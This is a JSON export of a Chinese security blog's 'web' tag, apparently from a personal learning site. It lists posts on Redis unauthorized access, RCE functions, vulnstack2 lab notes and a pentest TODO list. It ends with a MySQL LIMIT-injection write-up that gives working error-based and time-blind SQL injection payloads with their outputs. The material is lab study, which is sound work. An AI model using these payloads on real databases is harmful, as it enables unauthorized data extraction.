{"name":"web","slug":"web","count":5,"postlist":[{"title":"Redis未授权访问","slug":"redis未授权访问","date":"2021-02-22T16:04:48.000Z","updated":"2021-02-26T02:36:00.724Z","comments":true,"path":"api/articles/redis未授权访问.json","excerpt":"<h1 id=\"nginxphpredis环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#nginxphpredis环境搭建\"></a> Nginx+PHP+Redis环境搭建</h1>\n<p>环境搭建于arch，利用aur搭建的所以比较方便，系统不一样的请自行修改搭建步骤（也不难，这里记录下只是为了给下次省时间，其实主要还是改配置文件费时间，不同系统一样的）</p>","keywords":null,"cover":"https://blog.b0ring.cf/static/images/image-20210223223810960.png","content":null,"text":" Nginx+PHP+Redis环境搭建环境搭建于arch，利用aur搭建的所以比较方便，系统不一样的请自行修改搭建步骤（也不难，这里记录下只是为了给下次省时间，其实主要还是改配置文件费时间，不同系统一样的）Nginx环境搭建：1<br>yay -S nginx<br>修改配置文","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]},{"title":"RCE函数总结","slug":"rce_conclude","date":"2021-02-27T10:10:29.000Z","updated":"2021-02-27T14:38:20.186Z","comments":true,"path":"api/articles/rce_conclude.json","excerpt":"<p>最近由于面试，被面试官提到了无法回答的关于命令执行的问题，遂写此文总结各语言RCE时所碰到的函数和相关的知识点，查漏补缺，也方便自己以后使用到的时候可以快速使用。（后续可能根据积累持续更新）</p>","keywords":null,"cover":"../static/images/image-20210227220806587.png","content":null,"text":"最近由于面试，被面试官提到了无法回答的关于命令执行的问题，遂写此文总结各语言RCE时所碰到的函数和相关的知识点，查漏补缺，也方便自己以后使用到的时候可以快速使用。（后续可能根据积累持续更新） NodeJsnodejs的几个可用命令执行函数：child_process.spawn1","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]},{"title":"TODO（持续更新）","slug":"knowledge","date":"2021-02-28T07:08:03.000Z","updated":"2021-03-07T13:59:59.861Z","comments":true,"path":"api/articles/knowledge.json","excerpt":"","keywords":null,"cover":null,"content":"<p>同源策略总结</p>\n<p>​\tCORS</p>\n<p>​\tjsonp</p>\n<p>​\tcsrf</p>\n<p><a href=\"https://blog.b0ring.cf/#/posts/rce_conclude\">RCE总结</a><br />\n√ java<br />\n√ nodejs</p>\n<p>​\tgolang</p>\n<p>​\tphp</p>\n<p>sql注入</p>\n<p>​\t <a href=\"https://blog.b0ring.cf/#/posts/mysql_conclude\">mysql</a></p>\n<p>​\t\t√ limit 注入</p>\n<p>​\t\tgetshell 方法</p>\n<p>​\t\torder by 注入</p>\n<p>​\t\t文件读写函数</p>\n<p>​\t\tudf提权</p>\n<p>​\tsqlserver</p>\n<p>​\t\tgetshell 方法</p>\n<p>​\t\t文件读写方法</p>\n<p>​\t\t提权方法</p>\n<p>​\tOracle</p>\n<p>​\t\torder by注入</p>\n<p>内网渗透</p>\n<p>​\t免杀</p>\n<p>​\t域渗透</p>\n<p>​\t\t域搭建</p>\n<p>​\t\t域认证（NTLM和Kerberos，Windows Access Token）</p>\n<p>​\t反弹shell</p>\n<p>​\t内网转发</p>\n<p>​\t√ <a href=\"https://blog.b0ring.cf/#/posts/PrivilegeEscalation\">权限提升</a></p>\n<p>​\t权限维持</p>\n<p><a href=\"https://blog.b0ring.cf/#/posts/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">redis</a><br />\n√ webshell<br />\n√ ssh公钥登录<br />\n√ 计划任务<br />\n√ 主从复制getshell</p>\n<p>其他web组件</p>\n<p>​\tslor</p>\n<p>​\tshiro</p>\n<p>​\tweblogic</p>\n<p>​\tStruts2</p>\n<p>ssrf</p>\n<p>​\t不同语言下的特点</p>\n<p>​\t绕过方法</p>\n<p>vulnstack靶机总结（1~7）<br />\n已完成：<a src=\"https://blog.b0ring.cf/#/posts/vulnstack2\">2</a></p>\n","text":"同源策略总结​\tCORS​\tjsonp​\tcsrfRCE总结<br />√ java<br />√ nodejs​\tgolang​\tphpsql注入​\t mysql​\t\t√ limit 注入​\t\tgetshell 方法​\t\torder by 注入​\t\t文件读写函数​\t\tudf提权","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]},{"title":"vulnstack2靶场通关笔记","slug":"vulnstack2","date":"2021-03-01T08:35:59.000Z","updated":"2021-03-01T10:09:01.245Z","comments":true,"path":"api/articles/vulnstack2.json","excerpt":"<h2 id=\"环境介绍\"><a class=\"markdownIt-Anchor\" href=\"#环境介绍\"></a> 环境介绍</h2>\n<p>​\t三个靶机，分别为：</p>\n<p>​\t\tDC 机： 内网ip 10.10.10.10 Windows 2012</p>\n<p>​\t\tWEB：   内网ip 10.10.10.80     外网ip 192.168.111.80      Windows 2008</p>\n<p>​\t\tPC：       内网ip 10.10.10.201  外网ip 192.168.111.201\tWindows7</p>","keywords":null,"cover":"../static/images/image-20210301170011107.png","content":null,"text":" 环境介绍​\t三个靶机，分别为：​\t\tDC 机： 内网ip 10.10.10.10 Windows 2012​\t\tWEB：   内网ip 10.10.10.80     外网ip 192.168.111.80      Windows 2008​\t\tPC：       内网ip ","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]},{"title":"mysql 注入相关总结","slug":"mysql_conclude","date":"2021-03-01T15:56:43.000Z","updated":"2021-03-02T01:47:21.545Z","comments":true,"path":"api/articles/mysql_conclude.json","excerpt":"","keywords":null,"cover":"../static/images/image-20210302000052954.png","content":"<h1 id=\"从注入到webshell\"><a class=\"markdownIt-Anchor\" href=\"#从注入到webshell\"></a> 从注入到webshell</h1>\n<h1 id=\"limit注入\"><a class=\"markdownIt-Anchor\" href=\"#limit注入\"></a> Limit注入</h1>\n<p>limit注入的限制还是挺多的。</p>\n<p>首先，limit注入只存在于mysql 5.6.6版本以下当中。</p>\n<p>mysql在执行查询语句时，可在后面接analyse语句，而在5.6.6版本之前，analyse语句可以使用函数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from test LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),extractvalue(rand(),concat(0x3a,version())));</span><br><span class=\"line\">ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.62&#39;</span><br></pre></td></tr></table></figure>\n<p>5.6.6版本之后，mysql官方对analyse语句进行了改写，这里只能输入uint型的数据：</p>\n<p><img src=\"../static/images/image-20210302000052954.png\" alt=\"image-20210302000052954\" /></p>\n<p>因此5.6.6之后再利用这个特性会产生报错：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from site LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class=\"line\">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;extractvalue(rand(),concat(0x3a,version())),1)&#39; at line 1</span><br></pre></td></tr></table></figure>\n<p>而即便再5.5.x版本，实测在5.5.41版本中可以使用时间盲注：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from test limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1);</span><br><span class=\"line\">ERROR 1105 (HY000): XPATH syntax error: &#39;:0&#39;</span><br></pre></td></tr></table></figure>\n<p>然而在5.5.62版本中，无法使用时间盲注：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from test LIMIT 1,1 procedure analyse(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1); </span><br><span class=\"line\">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;),1)&#39; at line 1</span><br></pre></td></tr></table></figure>\n<p>但是报错注入都是可以用的。</p>\n<p>总结：</p>\n<p>在mysql 5.6.6版本之前，使用analyse函数时可以利用extractvalue函数进行报错注入，而在较低的版本中，还可以使用benchmark配合extractvalue在无回显下进行时间盲注，而在较高版本（至少5.5.62版本及之后），是不可以进行时间盲注的。</p>\n<h1 id=\"未完待续\"><a class=\"markdownIt-Anchor\" href=\"#未完待续\"></a> 未完待续……</h1>\n","text":" 从注入到webshell Limit注入limit注入的限制还是挺多的。首先，limit注入只存在于mysql 5.6.6版本以下当中。mysql在执行查询语句时，可在后面接analyse语句，而在5.6.6版本之前，analyse语句可以使用函数：1<br>2<br>mysq","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]}]}